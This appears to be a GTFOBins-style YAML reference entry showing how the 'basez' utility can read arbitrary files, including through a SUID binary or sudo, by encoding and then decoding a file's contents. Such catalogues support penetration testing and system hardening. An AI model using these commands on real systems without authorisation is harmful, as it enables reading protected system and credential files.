---
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        basez "$LFILE" | basez --decode
  suid:
    - code: |
        LFILE=file_to_read
        ./basez "$LFILE" | basez --decode
  sudo:
    - code: |
        LFILE=file_to_read
        sudo basez "$LFILE" | basez --decode
---
